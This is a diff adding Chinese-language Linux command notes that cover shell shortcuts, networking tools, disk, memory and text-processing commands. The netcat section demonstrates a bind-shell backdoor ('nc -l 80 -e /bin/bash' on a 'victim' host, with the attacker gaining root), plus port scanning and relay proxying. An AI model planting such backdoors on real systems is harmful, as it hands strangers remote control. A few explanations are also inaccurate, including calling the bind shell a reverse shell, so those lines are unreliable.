@@ -13,3 +13,956 @@
 :icons: font
 
 Doc writer yaoyihao1@gmail.com
+
+== 你可能不知道的个人常用命令
+
+----bash
+ctrl u 可以删除行内光标所在位置之前的内容 - 常用
+ctrl l 可以清屏 - 常用
+ctrl a 可以将光标移至行首
+ctrl e 可以将光标移至行尾
+ctrl k 可以删除光标至行尾的所有内容
+ctrl w 删除你键入的最后一个单词
+
+cd - 回到前一个工作路径
+----
+
+== 特殊符号的应用
+
+=== ! -d
+
+> 检查某个目录是否存在
+
+----
+和上面的命令类似。这里是检测目录是否为空，如果为空则退出命令
+skyler@bogon  ~/skyler/a [ ! -d /home/test/exist ] && exit
+检测目录是否为空，如果为空则创建该目录
+skyler@bogon  ~/skyler/a [ ! -d /home/test/exist ] && mkdir /home/test/exist
+
+----
+
+=== !$ 
+
+> 将上一条命令的参数传递给下一条命令参数
+
+当这个参数特别长的时候此命令特别有用
+
+----`bash
+skyler@bogon  ~/skyler/a 201910  cd /Users/skyler/skyler/a
+skyler@bogon  ~/skyler/a 201910  ll !$
+skyler@bogon  ~/skyler/a 201910  ll /Users/skyler/skyler/a
+total 64
+-rw-r--r--  1 skyler  staff   346B  8  8 11:55 Dockerfile
+-rw-r--r--  1 skyler  staff   249B  8  9 14:16 README.md
+----`
+
+===  !!
+
+> 执行上一条命令
+
+----bash
+[root@aizbp11lqlgyf2g31fgs4hg ~]# cat test.sh
+echo $# $0 $1
+aaa=111
+[root@aizbp11lqlgyf2g31fgs4hg ~]# !!
+cat test.sh
+echo $# $0 $1
+aaa=111
+----
+
+
+
+=== 从历史记录中使用命令号来运行命令
+
+首先输入 “**history**” 命令得到命令的序号
+
+----bash
+skyler@bogon  ~/bin history
+10063* [ ! d ~/test/exist ] && echo "no"
+10064* [ diff ~/test/exist ] && echo "no"
+10065* [ ! -d ~/test/exist ] && echo "no"
+10066* [ ! -d ~/bin ] && echo "no"
+----
+
+然后通过每行前的序号结合!来执行此行命令
+
+----bash
+skyler@bogon  ~/bin  !10065
+skyler@bogon  ~/bin  [ ! -d ~/test/exist ] && echo "no"
+----
+
+还可以使用!-n, n为数字
+
+----bash
+skyler@bogon  ~/bin  !-2
+skyler@bogon  ~/bin  [ ! -d ~/test/exist ] && echo "no"
+----
+
+
+
+== 系统信息
+
+----
+cat /proc
+uname
+----
+
+=== cat /proc 系统信息
+
+----
+cat /proc/{xxx}
+----
+
+=== uname
+
+----
+[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -a
+Linux aizbp11lqlgyf2g31fgs4hg 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+查看主机名
+[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -n
+aizbp11lqlgyf2g31fgs4hg
+
+查看linux发行版及版本号
+方法一
+[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/redhat-release
+CentOS Linux release 7.4.1708 (Core)
+
+方法二
+[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/os-release
+NAME="CentOS Linux"
+VERSION="7 (Core)"
+ID="centos"
+ID_LIKE="rhel fedora"
+VERSION_ID="7"
+PRETTY_NAME="CentOS Linux 7 (Core)"
+ANSI_COLOR="0;31"
+CPE_NAME="cpe:/o:centos:centos:7"
+HOME_URL="https://www.centos.org/"
+BUG_REPORT_URL="https://bugs.centos.org/"
+
+CENTOS_MANTISBT_PROJECT="CentOS-7"
+CENTOS_MANTISBT_PROJECT_VERSION="7"
+REDHAT_SUPPORT_PRODUCT="centos"
+REDHAT_SUPPORT_PRODUCT_VERSION="7"
+
+方法三
+[root@aizbp11lqlgyf2g31fgs4hg /]# lsb_release  -a
+LSB Version:	:core-4.1-amd64:core-4.1-noarch
+Distributor ID:	CentOS
+Description:	CentOS Linux release 7.4.1708 (Core)
+Release:	7.4.1708
+Codename:	Core
+----
+
+
+
+== 网络
+
+=== 网络连接(进程端口)
+
+----
+ss：查看网络连接
+lsof：查看网络连接
+----
+
+==== ss - socket statistics
+
+查看网络连接，代替netstat命令，使用更简洁。
+
+可以查看pid和服务端口的对应关系
+
+----bash
+[root@aizbp11lqlgyf2g31fgs4hg ~]# ss -ptl
+State      Recv-Q Send-Q                                                                                         Local Address:Port                                                                                                          Peer Address:Port
+LISTEN     0      128                                                                                                   *:ssh                                                                                                                      *:*                     users:(("sshd",pid=1329,fd=3))
+LISTEN     0      1                                                                                                  127.0.0.1:32000                                                                                                                    *:*                     users:(("java",pid=17595,fd=3))
+LISTEN     0      128                                                                                                       :::lanmessenger                                                                                                            :::*                     users:(("docker-proxy-cu",pid=2937,fd=4))
+[root@aizbp11lqlgyf2g31fgs4hg ~]#
+----
+
+----bash
+[root@aizbp11lqlgyf2g31fgs4hg ~]# ss -ptln|grep 20282
+LISTEN     0      100          *:20282                    *:*                   users:(("java",pid=17470,fd=21))
+----
+
+> `ss` 真正耀眼的地方是其内置的过滤能力
+
+只想看已建立的 socket（排除了 *listening* 和 *closed* ）
+
+----bash
+$ ss state connected sport = :ssh
+Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port
+tcp   ESTAB      0      0          192.168.0.136:ssh                      192.168.0.102:46540
+----
+
+列出指定的 host 或者 ip 段。例如，列出到达 74.125.0.0/16 子网的连接，这个子网属于 Google
+
+----bash
+$ ss state all dst 74.125.0.0/16
+Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port
+tcp   ESTAB      0      0          192.168.0.136:33616                   74.125.142.189:https
+tcp   ESTAB      0      0          192.168.0.136:42034                    74.125.70.189:https
+tcp   ESTAB      0      0          192.168.0.136:57408                   74.125.202.189:https
+----
+
+==== lsof - list open files
+
+> 非常实用的系统级的监控、诊断工具
+
+----bash
+查看指定端口有哪些进程在使用 lsof -i:PORT（lsof -i 列出所有的打开的网络连接） 
+[root@aizbp11lqlgyf2g31fgs4hg ~]# lsof -i:32000
+COMMAND   PID USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
+wrapper  1105 root    6u  IPv4 53752676      0t0  TCP localhost:32000->localhost:31001 (ESTABLISHED)
+java    17595 root    3u  IPv4 53752648      0t0  TCP localhost:32000 (LISTEN)
+java    17595 root   28u  IPv4 53752674      0t0  TCP localhost:31001->localhost:32000 (ESTABLISHED)
+
+查看指定进程pid打开的文件 losf -p pid
+[root@aizbp11lqlgyf2g31fgs4hg ~]# lsof -p 17595
+COMMAND   PID USER   FD   TYPE             DEVICE  SIZE/OFF     NODE NAME
+java    17595 root  mem    REG              253,1   1078737  1313486 /usr/local/cloudmonitor/lib/spring-core-4.2.4.RELEASE.jar
+java    17595 root  mem    REG              253,1   1097552  1313482 /usr/local/cloudmonitor/lib/spring-context-4.2.4.RELEASE.jar
+java    17595 root  mem    REG              253,1    731512  1313485 /usr/local/cloudmonitor/lib/spring-beans-4.2.4.RELEASE.jar
+
+列出被某个进程打开所有的网络文件
+lsof -i -a -p 234
+
+查看指定主机有哪些进程在使用
+lsof -i@192.168.1.91
+
+查看指定用戶打开的文件
+lsof -u messagebus
+
+查看指定程序打开的文件
+lsof -c firefox
+
+查看被删除的文件。有些删了的文件，但是进程没reload，那些空间还是占用的
+lsof|grep -i delete
+
+----
+
+
+
+=== 网络管理
+
+----
+ip：
+ifconfig：
+dig：
+----
+
+==== ip - show / manipulate routing, devices, policy routing and tunnels
+
+> ip 意在取代ifconfig
+
+----
+[root@aizbp11lqlgyf2g31fgsfhg ~]# ip addr|grep eth0
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+    inet 172.16.68.43/20 brd 172.16.79.255 scope global dynamic eth0
+----
+
+==== ifconfig - configure a network interface
+
+----
+[root@aizbp11lqlgyf2g31fgsfhg /]# ifconfig |grep inet
+        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet 172.16.68.43  netmask 255.255.240.0  broadcast 172.16.79.255
+        inet 127.0.0.1  netmask 255.0.0.0
+----
+
+==== dig - DNS lookup utility
+
+> DNS查找工具
+
+----
+dig 从DNS域名服务器查询指定主机信息
+dig baidu.com
+
+从指定的 DNS 服务器上查询
+dig @8.8.8.8 abc.filterinto.com
+
+跟踪整个查询过程
+如果你好奇 dig 命令执行查询时都经历了哪些过程，你可以尝试使用 +trace 选项。它会输出从根域到最终结果的所有信息：
+$ dig +trace abc.filterinto.com
+----
+
+
+
+=== 网络调试(网络诊断)
+
+----
+wireshark：
+nc：
+mtr：
+----
+
+
+
+==== wireshark
+
+> 强大的可视化工具 一定要会用 todo
+
+----
+wireshark
+----
+
+
+
+==== nc - netcat - Concatenate and redirect sockets
+
+> 既可以网络调试又数据传输, 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀
+>
+
+===== 网络调试
+
+----
+todo
+----
+
+===== 数据传输
+
+使用netcat实现聊天
+----
+47.98.189.37机器，监听80端口(注意:我这里是aliyun服务器，他的安全策略是只开放了80等端口，你使用其他端口可能无法实现聊天，这是因为阿里云的安全策略控制的，你需要配置你使用的端口)
+接收端启动监听
+[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80
+ff
+dfgdfg
+
+发送端(mac机器)连接47.98.189.37机器的80端口
+[skyler@mac ~]# nc 47.98.189.37 80
+ff
+dfgdfg
+
+输入ff、dfgdfg可以看到消息已经相互传递了。断开时需要手动Ctrl + c
+----
+
+使用netcat实现文件传输
+----
+[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 > test.sh
+[root@izbp10lqlgy2g31s41bt94z ~]# ll
+-rw-r--r-- 1 root root     0 10月 29 10:37 test.sh
+
+[skyler@mac ~]# nc 47.98.189.37 80 < test.sh
+传输完成，连接自动断开
+----
+
+===== 端口扫描工具
+
+----
+实例：nc -v -z -w2 192.168.31.164 1-100
+
+-v：显示指令执行过程；
+-z：使用0输入/输出模式，只在扫描通信端口时使用。
+-w2：设置等待连线的时间为2s；
+[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -v -z -w2 192.168.31.164 38322
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Connection timed out.
+----
+
+===== 安全工具
+----
+1. 端口转发，作为代理，
+2. 创建后门(也叫反弹shell)
+----
+
+=====# 端口转发，作为代理
+----
+端口转发
+我们通过选项 -c 来用 nc 进行端口转发，实现端口转发的语法为：
+[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -u -l  80 -c  'ncat -u -l 8080'
+
+作为代理
+[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 | nc 192.168.1.200 80
+所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:
+
+[root@aizbp11lqlgyf2g31fgsfhg ~]# mkfifo 2way
+[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 0<2way | nc 192.168.1.200 80 1>2way
+现在你可以通过 nc 代理来收发数据了。
+----
+
+====== 创建后门(也叫反弹shell)
+----
+受害者机器主动打开监听。-e为执行被给的命令，“nc -l 80 -e /bin/bash”含义为执行连接端输入的命令
+[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 -e /bin/bash
+
+攻击端(连接端)连接受害者机器80端口，然后输入命令获取受害者机器的信息，从而实现攻击
+[skyler@mac ~]# nc 47.98.189.37 80
+w
+ 11:21:25 up 493 days, 23:11,  1 user,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/0    210.12.157.87    10:13   13.00s  0.04s  0.00s w
+whoami
+root
+uname -a
+Linux izbp10lqlgy2g31s41bt94z 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+----
+
+===== 监测工具
+----
+启动监听。等待连接端连接
+[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80
+----
+
+
+
+==== mtr - a network diagnostic tool
+
+是一款更好的网络诊断、网络调试跟踪工具，集成了traceroute、ping、nslookup的判断主机的网络连通性功能，用于诊断网络状态非常有用
+
+----
+[root@aizbp11lqlgyf2g31fgsfhg ~]# mtr www.baidu.com
+----
+
+![image-20191019225352819](linux命令温故知新/image-20191019225352819.png)
+
+http://einverne.github.io/post/2017/11/mtr-usage.html
+
+
+
+=== 网络带宽
+
+----
+nethogs: 按进程查看流量占用
+iptraf: 按连接/端口查看流量
+ifstat: 按设备查看流量
+iftop: 按套接字看连接带宽流量占用
+ethtool: 诊断工具
+tcpdump: 抓包工具
+ss: 连接查看工具
+----
+
+
+
+=== 网络传输(数据)
+
+----
+scp：不同机器上远程拷贝文件
+nc：数据传输
+----
+
+==== scp - secure copy
+
+----
+scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。
+可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system时，用scp可以帮你把文件移出来。
+另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。
+虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用
+----
+
+===== 命令格式
+
+> scp [参数] [原路径] [目标路径]
+
+===== 命令功能
+
+scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。linux的scp命令可以在linux服务器之间复制文件和目录。
+
+===== 命令参数
+
+----
+-1 强制scp命令使用协议ssh1 
+-2 强制scp命令使用协议ssh2 
+-4 强制scp命令只使用IPv4寻址 
+-6 强制scp命令只使用IPv6寻址 
+-B 使用批处理模式（传输过程中不询问传输口令或短语） 
+-C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能） 
+-p 保留原文件的修改时间，访问时间和访问权限。 
+-q 不显示传输进度条。 
+-r 递归复制整个目录。 
+-v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。 
+-c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。 
+-F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。 
+-i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。  
+-l limit 限定用户所能使用的带宽，以Kbit/s为单位。  
+-o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式， 
+-P port 注意是大写的P, port是指定数据传输用到的端口号 
+-S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。
+----
+
+
+
+===== 使用实例
+
+=====# 从本地服务器上传到远程服务器
+
+----
+(1) 上传文件
+命令格式： 
+scp local_file remote_username@remote_ip:remote_folder 
+或者 
+scp local_file remote_username@remote_ip:remote_file 
+或者 
+scp local_file remote_ip:remote_folder 
+或者 
+scp local_file remote_ip:remote_file 
+
+第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名 
+第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名 
+
+实例：上传本地文件到远程机器指定目录
+scp /opt/soft/nginx-0.5.38.tar.gz root@10.80.100.20:/opt/soft/scptest
+说明
+上传本地opt/soft/目录下的文件nginx-0.5.38.tar.gz 到远程机器10.80.100.20的opt/soft/scptest目录
+
+(2) 上传目录
+命令格式： 
+scp -r local_folder remote_username@remote_ip:remote_folder 
+或者 
+scp -r local_folder remote_ip:remote_folder 
+第1个指定了用户名，命令执行后需要输入用户密码； 
+第2个没有指定用户名，命令执行后需要输入用户名和密码；
+
+实例：上传本地目录到远程机器指定目录
+scp -r /opt/soft/mongodb root@10.80.100.20:/opt/soft/scptest
+说明
+上传本地opt/soft/目录到远程机器10.80.100.20的opt/soft/scptest目录
+----
+
+
+
+=====# 从远程服务器下载到本地服务器
+
+----
+从远程下载到本地的scp命令与上面的命令雷同，只要将从本地上传到远程的命令后面2个参数互换顺序就行了。
+实例1：从远处下载文件到本地目录
+scp root@10.80.100.20:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/
+说明
+从10.80.100.20机器上的/opt/soft/的目录中下载nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中
+
+实例2：从远处下载目录到本地目录
+scp -r root@10.80.100.20:/opt/soft/mongodb /opt/soft/
+说明
+从10.80.100.20机器上的/opt/soft/中下载mongodb 目录到本地的/opt/soft/目录来。
+----
+
+参考：
+https://www.cnblogs.com/webnote/p/5877920.html
+
+==== nc - 数据传输
+聊天
+----
+看看8090端口是否在使用
+[work@vm ~]$ lsof -i:8090
+
+监听8090端口
+[work@vm ~]$ nc -l 8090
+ffff
+ggg
+wo shi ni de
+
+连接10.26.21.4机器的8090端口，注意
+[skyler@skyler ~]$ nc 10.26.21.4 8090
+ffff
+ggg
+wo shi ni de
+----
+
+
+
+
+== CPU、内存、硬盘的使用状态
+
+=== cpu使用状态
+
+----
+top：获取 CPU 和硬盘的使用状态，通常使用使用 top（htop 更佳）
+iostat：CPU利用情况报告
+mpstat：CPU实时监控工具
+----
+
+==== 'iostat -c' CPU利用情况报告
+
+----
+iostat -c 1 10
+avg-cpu: %user %nice %sys %iowait %idle
+1.98 0.00 0.35 11.45 86.22
+avg-cpu: %user %nice %sys %iowait %idle
+1.62 0.00 0.25 34.46 63.67
+----
+
+==== mpstat- Multiprocessor Statistics
+
+> 实时CPU监控工具
+
+----
+
+----
+
+
+
+=== IO
+
+----
+iostat:设备、分片的输入输出统计数据
+iotop:监视磁盘I/O使用状况工具
+----
+
+
+
+==== iostat - 报告CPU统计数据和设备、分片的输入输出统计数据
+
+----
+iostat主要用于监控系统设备的IO负载情况
+iostat -mxz 15 可以让你获悉 CPU 和每个硬盘分区的基本信息和性能表现
+----
+
+
+
+==== iotop – simple top-like I/O monitor
+
+> iotop是一个用来监视磁盘I/O使用状况的 top 类工具，可监测到哪一个程序使用的磁盘IO的信息（requires 2.6.20 or later）
+
+
+
+=== 内存使用状态
+
+----
+free：展示内存的已使用和空闲的数量数据
+vmstat：报告虚拟内存统计数据
+/proc/meminfo：包含了更多更原始的信息，只是看起来不太直观
+区别：free为你提供了概要信息，输出结果清晰；/proc/meminfo提供更多更原始的信息，是了解Linux系统内存使用状况的主要接口，我们最常用的”free”、”vmstat”等命令就是通过它获取数据的 
+----
+
+
+
+==== free - Display amount of free and used memory in the system
+
+----
+free
+[root@aizbp11lqlgyf2g31fgsfhg ~]# free -h
+              total        used        free      shared  buff/cache   available
+Mem:           1.8G        1.1G         88M        668K        581M        501M
+Swap:            0B          0B          0B
+
+cat /proc/meminfo
+[root@aizbp11lqlgyf2g31fgsfhg ~]# cat /proc/meminfo
+MemTotal:        1883492 kB
+MemFree:           91292 kB
+MemAvailable:     513480 kB
+Buffers:          105988 kB
+Cached:           425896 kB
+SwapCached:            0 kB
+Active:          1398952 kB
+Inactive:         287908 kB
+Active(anon):    1155456 kB
+Inactive(anon):      188 kB
+Active(file):     243496 kB
+Inactive(file):   287720 kB
+Unevictable:           0 kB
+Mlocked:               0 kB
+----
+
+==== vmstat - Report virtual memory statistics
+
+----
+vmstat: 内存使用状态
+[root@aizbp11lqlgyf2g31fgsfhg ~]# vmstat
+procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
+ r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
+ 4  0      0  91008 106004 489120    0    0     3    11    1    0  2  1 98  0  0
+----
+
+==== /proc/meminfo
+
+----
+
+----
+
+
+
+=== 硬(磁)盘使用状态
+
+----
+df：检查文件系统磁盘占用情况
+du：检查磁盘空间占用情况,计算每个文件的大小然后累加
+ncdu：是一个可以替代du命令的工具
+iostat：硬盘的输入输出使用状态
+fdisk：磁盘分区表数据，可以创建和维护分区表
+
+du与df的区别：
+du是通过搜索文件来计算每个文件的大小然后累加，du能看到的文件只是一些当前存在的，没有被删除的。他计算的大小就是当前他认为存在的所有文件大小的累加和。而df是检查文件系统的磁盘空间使用情况
+
+du与ncdu的区别：
+ncdu是一个可以替代du命令的工具，ncdu命令是对传统du命令功能上的增强.它比寻常的命令，如 du -sh *，更节省时间
+----
+
+==== df - disk free
+
+----
+df -h 查看各分区使用情况 
+[root@aizbp11lqlgyf2g31fgsfhg ~]# df -h
+文件系统        容量  已用  可用 已用% 挂载点
+/dev/vda1        40G   19G   19G   51% /
+devtmpfs        911M     0  911M    0% /dev
+tmpfs           920M     0  920M    0% /dev/shm
+tmpfs           920M  668K  920M    1% /run
+tmpfs           920M     0  920M    0% /sys/fs/cgroup
+tmpfs           184M     0  184M    0% /run/user/0
+overlay          40G   19G   19G   51% /var/lib/docker/overlay2/85bcc5f201ed0fbf82697f11da0730fbb8543b0e6cc9707b43b331e6e02d4eb0/merged
+shm              64M     0   64M    0% /var/lib/docker/containers/10f26d49e94eb6042a25a7807f293a5b75abe75af571414c0ae6e878b0ccdf41/shm
+
+----
+
+![image-20191020231155867](linux命令温故知新/image-20191020231155867.png)
+
+==== du - disk usage
+
+> 硬盘使用情况概述
+
+----
+查看root目录下的直接层级文件(夹)大小
+[root@aizbp11lqlgyf2g31fgsfhg ~]# du -sh *
+52K	hs_err_pid24203.log
+52K	hs_err_pid25726.log
+52K	hs_err_pid27481.log
+4.0K	log.stack
+2.2G	skyler_home
+4.0K	test2.sh
+4.0K	test.sh
+4.0K	wget-log
+[root@aizbp11lqlgyf2g31fgsfhg ~]# pwd
+/root
+
+查看root目录下的所有层级文件(夹)大小
+[root@aizbp11lqlgyf2g31fgsfhg ~]# du -h *
+略
+----
+
+==== ncdu
+
+----
+aliyun默认没有这个命令
+----
+
+==== iostat：硬盘的输入输出使用状态
+
+----
+
+----
+
+==== fdisk：磁盘分区表数据
+
+----
+列出所有磁盘数据
+[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk  -l
+
+磁盘 /dev/vda：42.9 GB, 42949672960 字节，83886080 个扇区
+Units = 扇区 of 1 * 512 = 512 bytes
+扇区大小(逻辑/物理)：512 字节 / 512 字节
+I/O 大小(最小/最佳)：512 字节 / 512 字节
+磁盘标签类型：dos
+磁盘标识符：0x0008d73a
+
+   设备 Boot      Start         End      Blocks   Id  System
+/dev/vda1   *        2048    83884031    41940992   83  Linux
+
+查看/dev/vda1磁盘数据，并可以修改
+[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk /dev/vda1
+欢迎使用 fdisk (util-linux 2.23.2)。
+
+更改将停留在内存中，直到您决定将更改写入磁盘。
+使用写入命令前请三思。
+
+Device does not contain a recognized partition table
+使用磁盘标识符 0xbc589282 创建新的 DOS 磁盘标签。
+
+命令(输入 m 获取帮助)：p
+
+磁盘 /dev/vda1：42.9 GB, 42947575808 字节，83881984 个扇区
+Units = 扇区 of 1 * 512 = 512 bytes
+扇区大小(逻辑/物理)：512 字节 / 512 字节
+I/O 大小(最小/最佳)：512 字节 / 512 字节
+磁盘标签类型：dos
+磁盘标识符：0xbc589282
+
+     设备 Boot      Start         End      Blocks   Id  System
+
+命令(输入 m 获取帮助)：
+----
+
+
+
+== 文本处理相关
+
+=== 排序与过滤
+
+==== sort 排序
+
+----
+sort
+-t 指定分隔符（通常与 -k 联用）
+-k 指定用于排序的列号
+-n 以数字进行排序
+
+实例：
+[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh
+echo $# $0 $1
+aaa=111
+echoaaa=1
+echo aaa=31
+fff=3
+bbbf=50
+aaa=111
+
+[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -n -t = -k 2 test.sh
+echo $# $0 $1
+echoaaa=1
+fff=3
+echo aaa=31
+bbbf=50
+aaa=111
+aaa=111
+----
+
+可以看到文本按数字大小排序输出。最后两行是重复的，过滤重复我们就需要`uniq`命令了
+
+==== uniq 过滤
+
+----
+往往与sort一起使用，从名字可以看出来，取唯一的意思
+解决上文sort -n -t = -k 2 test.sh重复数据的问题，我们只需要这样做
+[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -t = -k 2 -n test.sh |uniq
+echo $# $0 $1
+echoaaa=1
+fff=3
+echo aaa=31
+bbbf=50
+aaa=111
+----
+
+=== 截取与连接
+
+==== cut 按列切分文本
+
+----
+-b 以字节为单位进行分割
+-c 以字符为单位进行分割
+-f 以字段为分隔单位，与-d一起使用，指定显示哪个区域
+-d 指定分隔符，默认制表符
+
+实例：获取test-project-web服务配置中第18列=右侧的信息
+全部信息为：
+[skyler@tt ~]$ ps -ef|grep test-project-web
+skyler     11021     1  3 10月09 ?      06:41:36 /usr/local/bin/java -server -Xmn1024m -Xms4096m -Xmx4096m -XX:PermSize=64M -XX:MaxPermSize=128M -XX:+PrintGCDetails -XX:+PrintGCDateStamps -Xloggc:/home/skyler/var/test-project/log/gc.log -Dlogging.path=/home/skyler/var/test-project/log -Dlogging.config.path=/data0/skyler/test-project/test-project/config/cp/ -Dlogging.config=/data0/skyler/test-project/test-project/config/cp/base-logback.xml -jar /data0/skyler/test-project/test-project/lib/test-project-web-1.1.0.jar --spring.profiles.active=dev --spring.config.location=classpath:/,/data0/skyler/test-project/test-project/system/ --spring.config.name=application
+
+[skyler@tt ~]$ ps -ef|grep test-project-web|awk '{print $18}'|cut -d = -f 2
+/home/skyler/var/test-project/log
+----
+
+
+
+==== paste 按列拼接文本
+
+----
+可以将两个文件的内容拼接在一起
+实例：将test.sh与test2.sh拼接在一起
+[root@aizbp11lqlgyf2g31fgsfhg ~]# echo "aa2" > test2.sh
+
+[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh
+echo $# $0 $1
+aaa=111
+echoaaa=1
+echo aaa=31
+fff=3
+bbbf=50
+aaa=111
+
+[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh
+echo $# $0 $1	aa2
+aaa=111
+echoaaa=1
+echo aaa=31
+fff=3
+bbbf=50
+aaa=111
+
+-d 按指定分隔符拼接
+[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh -d ','
+echo $# $0 $1,aa2
+aaa=111,
+echoaaa=1,
+echo aaa=31,
+fff=3,
+bbbf=50,
+aaa=111,
+
+----
+
+
+
+=== 行列操作 - 重点
+
+==== awk - 列操作
+
+----
+awk 和 sed
+----
+
+==== sed - 操作
+
+----
+
+----
+
+
+
+
+
+== 文件处理相关
+
+=== 文件内容比较
+
+==== diff
+
+----bash
+diff file1 file2 -y
+
+使用 diff -r tree1 tree2 | diffstat 查看变更的统计数据
+----
+
+==== vimdiff - edit two, three or four versions of a file with Vim and show differences
+
+----
+vimdiff 用于比对并编辑文件
+----
+
+
+
+
+
+== 服务程序
+
+=== 压测
+
+----
+ab 工具（Apache 中自带）可以简单粗暴地检查 web 服务器的性能。对于更复杂的负载测试，使用 siege
+----
+
+=== java
+
+Jps
+
+=== 程序试错检查
+
+----
+了解 strace 和 ltrace。这俩工具在你的程序运行失败、挂起甚至崩溃，而你却不知道为什么或你想对性能有个总体的认识的时候是非常有用的。注意 profile 参数（-c）和附加到一个运行的进程参数 （-p）
+
+strace：调试系统调用
+strace 经常被认为是程序员的调试工具，但它的功用不仅仅用来调试。它可以截获和记录进程调用系统的情况。因而，它是一个实用的诊断、教学和调试工具。比如说，你可以使用strace来查出某个程序在启动时实际上使用哪个配置文件。
+
+不过strace的确有一个缺陷。它在检查某个进程时，该进程的性能会一落千丈。因而，只有在我已经有极其充分的理由认为某个程序引起问题的情况下，才使用strace
+----
+
+
+
+== 常用命令
+
+----
+获取java_server_name的第18列值，等号分隔。尤其适合java -jar多个参数的场景
+ps -ef|grep java_server_name|awk '{print $18}'|cut -d = -f 2
+
+----
